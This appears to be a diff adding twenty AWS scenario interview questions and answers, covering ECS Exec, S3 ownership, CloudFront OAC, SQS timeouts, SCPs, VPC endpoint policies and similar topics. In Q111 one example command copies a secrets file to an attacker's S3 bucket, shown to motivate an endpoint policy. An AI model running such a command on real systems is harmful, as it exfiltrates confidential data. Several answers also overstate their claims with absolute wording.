@@ -899,4 +899,235 @@ Use both together for full audit trail: Config for state, CloudTrail for actions
 
 ---
 
+**Q101. [L2] A developer needs to temporarily get a shell inside a running Fargate container in a private subnet with absolutely no inbound SSH access. How do you facilitate this securely?**
+
+> *What the interviewer is testing:* ECS Exec, AWS Systems Manager (SSM) Session Manager.
+
+**Answer:**
+You would use **ECS Exec** (which is powered by AWS Systems Manager Session Manager under the hood).
+1. Ensure the ECS Task Role has the required SSM permissions (`ssmmessages:CreateControlChannel`, etc.).
+2. Update the ECS Service or Task definition to explicitly enable `EnableExecuteCommand: true`.
+3. The developer uses the AWS CLI to run: `aws ecs execute-command --cluster <cluster> --task <task_id> --container <app> --interactive --command "/bin/sh"`.
+This opens a secure, audited websocket tunnel directly into the container. There are no SSH keys to manage, no inbound ports need to be opened on the Security Group, and every shell command typed is fully logged to CloudWatch/CloudTrail.
+
+---
+
+**Q102. [L3] A team in AWS Account A is writing data to an S3 bucket in Account B. Account B explicitly grants them `s3:PutObject` in the bucket policy. However, when Account B administrators try to read the files, they get `Access Denied`. Why, and how is it fixed?**
+
+> *What the interviewer is testing:* Cross-account S3 Object Ownership.
+
+**Answer:**
+Historically, in S3, the AWS account that uploads the object retains explicit ownership and full control of that object, even if the bucket itself belongs to a different account. Because Account A uploaded the file, Account A owns it, and Account B (the bucket owner) is locked out unless Account A explicitly grants them read ACLs during the upload (`--acl bucket-owner-full-control`).
+*The Modern Fix:* In Account B, go to the S3 bucket settings and enable **S3 Object Ownership: Bucket owner enforced**. This entirely disables all legacy ACLs. The bucket owner (Account B) automatically and forcefully assumes ownership of every file uploaded to the bucket, instantly restoring their read access.
+
+---
+
+**Q103. [L2] You are deploying an API Gateway mapped to a custom domain name natively in the `eu-west-1` (Ireland) region. You request a free ACM (AWS Certificate Manager) SSL certificate in `eu-west-1`, but API Gateway absolutely refuses to let you select it from the dropdown. Why?**
+
+> *What the interviewer is testing:* Edge-optimized APIs vs Regional APIs, ACM region constraints.
+
+**Answer:**
+This happens because you selected an **Edge-Optimized** API Gateway endpoint.
+Edge-optimized endpoints are actually deployed globally onto the CloudFront Content Delivery Network (CDN) edge locations. CloudFront strictly mandates that all ACM SSL certificates must reside exclusively in the **`us-east-1` (N. Virginia)** region, regardless of where the underlying API Gateway actually lives.
+*Fix:* Either request a new ACM certificate in `us-east-1` and attach it, or change the API Gateway endpoint type from "Edge-Optimized" to "Regional", which will natively accept the existing `eu-west-1` certificate.
+
+---
+
+**Q104. [L1] In Amazon Route 53, what is the critical architectural difference between a standard DNS `CNAME` record and an AWS `Alias` record?**
+
+> *What the interviewer is testing:* Route 53 proprietary features, Zone Apex limitations.
+
+**Answer:**
+A **CNAME (Canonical Name)** essentially maps one domain to another domain. However, the strict global DNS protocol absolutely forbids a CNAME from being placed at the "Zone Apex" (the naked root domain, e.g., `company.com`).
+An **Alias Record** is an AWS-specific proprietary extension that acts like a CNAME but resolves under the hood directly to an IP address. 
+1. **Zone Apex:** You *can* place an Alias record at the root domain (`company.com`) to seamlessly point to an ALB or CloudFront distribution.
+2. **Cost & Speed:** Alias records to AWS resources are completely free of charge in Route 53 and resolve faster natively within the AWS network.
+
+---
+
+**Q105. [L2] You migrate an application from a traditional RDS instance to Aurora Serverless v2. During a sudden 10x traffic spike, the database scales up successfully, but the application crashes heavily citing "Too many connections." Why didn't Aurora solve the connection limits?**
+
+> *What the interviewer is testing:* Compute scaling vs TCP connection limits.
+
+**Answer:**
+Aurora Serverless v2 dynamically scales compute (CPU and RAM) via ACUs (Aurora Capacity Units) in milliseconds. However, it scales the *underlying instance size*. It does not act as a TCP connection multiplexer.
+When traffic spikes 10x, the application spawns 10x more active TCP connections to the database. Even though the database has the CPU to handle the queries, the raw connection pool limit was breached before the engine could scale up enough to accommodate the new `max_connections` parameter limit.
+*Fix:* Serverless databases must always be paired with a connection pooler like **Amazon RDS Proxy** to efficiently queue and multiplex the massive influx of microservice TCP connections into a small, steady pool of long-lived database connections.
+
+---
+
+**Q106. [L2] To secure an S3 bucket powering a static website, you put CloudFront in front of it. How do you strictly guarantee that users can never bypass CloudFront and access the S3 bucket directly via its public URL?**
+
+> *What the interviewer is testing:* Origin Access Control (OAC), S3 Bucket Policies.
+
+**Answer:**
+You must implement **Origin Access Control (OAC)** (the modern replacement for Origin Access Identity, OAI).
+1. Block all Public Access directly on the S3 bucket.
+2. In CloudFront, configure the S3 Origin to strictly use an OAC.
+3. Update the S3 Bucket Policy to explicitly grant `s3:GetObject` permission strictly to the Principal `cloudfront.amazonaws.com`, utilizing a `Condition` block that enforces `StringEquals: AWS:SourceArn` matching the specific ARN of your CloudFront distribution.
+This mathematically guarantees that the bucket will aggressively reject any request that didn't natively originate from your precise CloudFront distribution.
+
+---
+
+**Q107. [L1] An engineer argues that if they upload a file to S3 and immediately trigger a Lambda function to read that file, the Lambda might violently crash with a `404 Not Found` due to S3's "Eventual Consistency". Are they correct?**
+
+> *What the interviewer is testing:* Modern S3 consistency models (Strong Consistency).
+
+**Answer:**
+**No.** They are referencing outdated architecture. 
+As of December 2020, Amazon S3 provides **Strong Read-After-Write Consistency** automatically for all `PUT` and `DELETE` requests globally. 
+If an application uploads a file successfully (receiving an HTTP 200), any subsequent `GET` request, even a millisecond later from a Lambda function, is mathematically guaranteed to see the file. Eventual consistency is no longer an issue in standard S3 operations.
+
+---
+
+**Q108. [L3] Your EC2 Auto Scaling Group (ASG) dynamically scales down during the night. However, when it terminates an instance, active users downloading large files are abruptly violently disconnected. How do you gracefully drain those connections?**
+
+> *What the interviewer is testing:* ASG Lifecycle Hooks, ALB Deregistration Delay.
+
+**Answer:**
+This requires a two-part solution utilizing application load balancing and ASG native hooks:
+1. **ALB Deregistration Delay (Connection Draining):** On the ALB Target Group, configure a deregistration delay (e.g., 300 seconds). When the instance is marked for termination, the ALB stops sending *new* requests to it, but keeps the instance alive in a "draining" state allowing active downloads to finish cleanly.
+2. **ASG Lifecycle Hooks:** Add a `Terminating` Lifecycle Hook to the ASG. This intercepts the EC2 termination command and puts the instance into a `Terminating:Wait` state. The instance runs a shutdown script to naturally close stateful background workers, flush caches to Redis, and finally sends a `CompleteLifecycleAction` API call to AWS, allowing the instance to securely power off.
+
+---
+
+**Q109. [L2] You have an SQS queue triggering a Lambda function to encode massive video files. Sometimes a video takes 8 minutes to encode. You randomly notice the exact same video being encoded simultaneously by two different Lambda functions. Why?**
+
+> *What the interviewer is testing:* SQS Visibility Timeout.
+
+**Answer:**
+The **SQS Visibility Timeout** is misconfigured.
+When a Lambda polls SQS, the message doesn't delete immediately; it becomes "invisible" to other consumers for the duration of the Visibility Timeout (default 30 seconds). 
+Because the video encode takes 8 minutes, the 30-second timeout expires violently mid-encode. SQS assumes the first Lambda quietly crashed, making the message instantly visible again. A second Lambda picks up the identical message and starts encoding it.
+*Fix:* You must increase the SQS Visibility Timeout to be strictly greater than the maximum theoretical runtime of the Lambda function (e.g., set it to 10 minutes, or 600 seconds).
+
+---
+
+**Q110. [L2] To save 70% on compute costs, you heavily adopt EC2 Spot Instances for your stateless batch processing data pipeline. However, AWS can arbitrarily terminate Spot instances when they need capacity back. How can you ensure your batch jobs don't leave databases in a corrupted state when killed?**
+
+> *What the interviewer is testing:* Spot Instance Interruption Notices.
+
+**Answer:**
+AWS natively provides a **2-Minute Spot Instance Interruption Notice** before the instance is forcefully terminated.
+1. The application or a background daemon must constantly poll the local EC2 Instance Metadata Service (IMDS) at `http://169.254.169.254/latest/meta-data/spot/instance-action` or listen for EventBridge events.
+2. When the 2-minute warning appears, the application must immediately stop accepting new batch jobs, gracefully checkpoint its current processing state to DynamoDB/S3, safely roll back incomplete database transactions, and disconnect.
+
+---
+
+**Q111. [L3] An auditor requires that no EC2 instance in a private VPC subnet can exfiltrate data to an unauthorized S3 bucket. You map a VPC Gateway Endpoint to S3. How do you actually enforce the restriction to your specific bucket?**
+
+> *What the interviewer is testing:* VPC Endpoint Policies.
+
+**Answer:**
+Creating a VPC Endpoint simply keeps the traffic on the AWS private backbone; it does not secure it inherently. An attacker could still run `aws s3 cp secrets.txt s3://attacker-bucket`.
+To enforce security, you must attach a strict **VPC Endpoint Policy** (a resource policy) directly to the VPC Gateway Endpoint. 
+The policy must explicitly `Deny` all `s3:PutObject` actions unless the `Resource` ARN exactly matches your authorized corporate bucket (`arn:aws:s3:::my-secure-corporate-bucket/*`). This guarantees that even if a developer inputs credentials for an external AWS account, the VPC network layer will aggressively drop the traffic.
+
+---
+
+**Q112. [L2] You create a DynamoDB table heavily queried by `UserID`. Months later, the business wants to query by `EmailAddress`. You go to add a Local Secondary Index (LSI) but the AWS console firmly prevents you. Why?**
+
+> *What the interviewer is testing:* Global (GSI) vs Local (LSI) Index immutability constraints.
+
+**Answer:**
+**Local Secondary Indexes (LSIs)** are deeply embedded into the physical partition layout of the original DynamoDB table (forcing the same Partition Key, but allowing a new Sort Key). Because of this physical constraint, LSIs **must** be created at the exact moment the table is initially created. They are entirely immutable and cannot be added later.
+*Fix:* You must instead create a **Global Secondary Index (GSI)**. GSIs are essentially asynchronous replica tables maintained by AWS under the hood. They can be dynamically added or securely deleted at any time with zero downtime to the primary table.
+
+---
+
+**Q113. [L2] Your company uses AWS Organizations. You log in as the absolute overarching Root User of a member account and try to delete a CloudTrail log, but you violently receive an `Access Denied` error. How is the Root User denied permission?**
+
+> *What the interviewer is testing:* Service Control Policies (SCPs) overriding Root.
+
+**Answer:**
+This is the immense power of **Service Control Policies (SCPs)** administered from the AWS Organizations Management (Master) account. 
+An SCP operates as an invisible, overarching boundary. If an SCP applied at the Organization or OU level possesses an explicit `Deny` for `cloudtrail:DeleteTrail`, it forcefully supersedes everything below it. 
+It mathematically strips that permission away from *every* entity inside the member account—expressly including the usually omnipotent Root User and Administrator IAM Roles. Only the supreme administrators of the overarching Management Account can alter the SCP.
+
+---
+
+**Q114. [L3] An application successfully utilizes AWS EFS (Elastic File System) for shared WordPress storage. It performs beautifully for 3 months, then suddenly grinds to a catastrophic halt, dropping to 1 MB/s throughput daily. Why?**
+
+> *What the interviewer is testing:* EFS Burst Credits and Baseline Throughput.
+
+**Answer:**
+The application has exhausted its **EFS Burst Credits**. 
+By default, EFS operates in "Bursting Throughput" mode. You are constantly awarded credits based purely on how much data you store. If you only store 10 GB of data, your baseline throughput is a microscopic 0.5 MB/s. 
+The application was heavily utilizing accrued "Burst" credits (up to 100 MB/s) to mask the low baseline. After 3 months of heavy traffic, the credit bank hit absolute zero. 
+*Fix:* Immediately switch the EFS configuration mode from "Bursting" to **Provisioned Throughput** (e.g., paying for a guaranteed 50 MB/s regardless of storage size) or "Elastic Throughput" mode to instantly restore performance.
+
+---
+
+**Q115. [L2] A serverless payment gateway workflow occasionally takes up to 3 days to resolve because it waits heavily for manual human approval. Should you use AWS Step Functions Standard or Express Workflows?**
+
+> *What the interviewer is testing:* Step Function workflow duration limits.
+
+**Answer:**
+You must undeniably use **Standard Workflows**.
+- **Standard Workflows:** Support extremely long-running, auditable executions that can pause and wait cleanly for up to **1 year**. They are billed per transition, making them perfect for manual human approval steps and long-polling.
+- **Express Workflows:** Are designed explicitly for massive, high-volume event processing (thousands per second). Their absolute maximum execution duration is capped violently at **5 minutes**. They would time out instantly in this scenario.
+
+---
+
+**Q116. [L2] You enabled AWS CloudTrail across your organization. However, when you search the logs to find out who uploaded a specific image `logo.png` into an S3 bucket, nothing appears. You only see bucket creation events. Where is the log?**
+
+> *What the interviewer is testing:* Management Events vs Data Events.
+
+**Answer:**
+By default, CloudTrail only records **Management Events** (Control Plane actions). These include creating infrastructure (`CreateBucket`, `RunInstances`, `UpdateSecurityGroup`).
+It natively ignores **Data Events** (Data Plane actions) like `s3:GetObject`, `s3:PutObject`, or `dynamodb:PutItem` because logging trillions of them would result in astronomical CloudTrail bills. 
+To see the `logo.png` upload, you must explicitly edit the CloudTrail configuration and opt-in to paying to record **Data Events** specifically targeting that S3 bucket.
+
+---
+
+**Q117. [L1] In Amazon ECS, what is the exact difference between the "Task Role" and the "Task Execution Role"?**
+
+> *What the interviewer is testing:* IAM segmentation in container orchestration.
+
+**Answer:**
+Both roles serve entirely different isolation boundaries:
+- **Task Execution Role:** Used entirely by the ECS/Fargate *Agent* (the infrastructure) *before* your code runs. It needs permissions strictly to pull the Docker image from ECR and natively push the container logs up to CloudWatch.
+- **Task Role:** Used directly by *Your Application Code* once the container boots up. If your Python script running inside the container needs to read an S3 bucket or query DynamoDB, those precise permissions must reside exclusively on this role.
+
+---
+
+**Q118. [L3] A fleet of 5,000 Lambda functions in a private VPC aggressively scrape data from the public internet. Randomly, hundreds of them begin crashing with bizarre `Connection Timed Out` networking errors, despite the internet destination being perfectly healthy. What AWS bottleneck is occurring?**
+
+> *What the interviewer is testing:* NAT Gateway SNAT Port Exhaustion.
+
+**Answer:**
+This is classic **SNAT (Source Network Address Translation) Port Exhaustion** on the NAT Gateway.
+A single AWS NAT Gateway utilizes a single public Elastic IP. TCP allows a theoretical maximum of ~65,000 ephemeral outbound ports per IP addressing a single destination. 
+When 5,000 highly concurrent Lambda functions open thousands of individual API connections to the exact same external internet API simultaneously, the NAT Gateway completely runs out of ephemeral routing ports. It violently drops any new outbound connection attempts until old ones close.
+*Fix:* Heavily deploy multiple NAT Gateways across multiple public subnets and route traffic dynamically to distribute the SNAT allocation, or deploy dedicated NAT instances.
+
+---
+
+**Q119. [L2] You want to ensure that a highly powerful IAM Administrative User can only execute critical API calls if they are physically situated in the corporate headquarters. How do you enforce this natively in IAM?**
+
+> *What the interviewer is testing:* IAM Condition Keys (`aws:SourceIp`).
+
+**Answer:**
+You would append a `Condition` block to their overarching IAM Policy (or a global SCP) that heavily restricts authentication based on their explicit IP address.
+```json
+"Condition": {
+    "NotIpAddress": {
+        "aws:SourceIp": ["203.0.113.50/32"]
+    }
+}
+```
+If the policy is an explicit `Deny` with a `NotIpAddress` condition, any devastating `ec2:Terminate*` or `s3:Delete*` AWS API calls originating from a coffee shop IP address are aggressively rejected by AWS IAM instantly.
+
+---
+
+**Q120. [L2] A data analytics team is migrating from traditional Amazon Redshift DC2 instances to the modern RA3 node types. What massive architectural paradigm shift does RA3 bring that drastically reduces costs?**
+
+> *What the interviewer is testing:* Redshift compute and storage separation.
+
+**Answer:**
+Legacy Redshift nodes (like DC2/DS2) tightly coupled Compute and Storage physically onto the single instance. If you strictly needed 50TB of storage, you were forced to aggressively provision and pay for dozens of compute nodes, even if you only ran 3 simple SQL queries a day, wasting immense amounts of money.
+**RA3 Nodes** natively introduce the **Separation of Compute and Storage**. Compute instances only hold a small local cache. The vast majority of the 50TB of data is seamlessly offloaded securely into S3 storage. You can now aggressively scale compute solely for the query performance you require independent of your massive data volume, resulting in huge savings.
+
+---
+
 *More AWS scenarios added periodically. PRs welcome.*
